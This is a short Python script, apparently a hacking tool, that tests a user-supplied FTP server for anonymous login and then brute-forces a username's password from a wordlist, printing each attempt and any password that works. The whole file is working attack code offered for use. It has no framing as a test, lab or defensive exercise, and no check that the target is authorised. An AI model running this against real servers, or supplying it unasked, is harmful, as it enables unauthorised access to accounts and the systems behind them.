import ftplib
import aioftp
def check_anonymous_login(host, port=21):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port)
        ftp.login()
        print(f"[+] Anonymous login successful on {host}:{port}")
        ftp.quit()
        return True
    except ftplib.all_errors as e:
        print(f"[-] Anonymous login failed on {host}:{port}")
        print(f"Error: {e}")
        return False

def brute_force_ftp(host, port=21, username=None, password_list=None):
    if not username:
        print("[-] Username is required for brute force attack.")
        return

    if not password_list:
        print("[-] Password list is required for brute force attack.")
        return

    with open(password_list, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port)
            ftp.login(user=username, passwd=password)
            print(f"[+] Login successful with username: {username} and password: {password}")
            ftp.quit()
            return
        except ftplib.all_errors as e:
            print(f"[-] Login failed with username: {username} and password: {password}")
            print(f"Error: {e}")
            continue

def main():
    host = input("Enter the FTP server address: ")
    port = int(input("Enter the FTP server port (default is 21): ") or 21)

    # Check for anonymous login
    if check_anonymous_login(host, port):
        return

    # Brute force attack
    username = input("Enter the username for brute force attack: ")
    password_list = input("Enter the path to the password list: ")

    brute_force_ftp(host, port, username, password_list)

if __name__ == "__main__":
    main()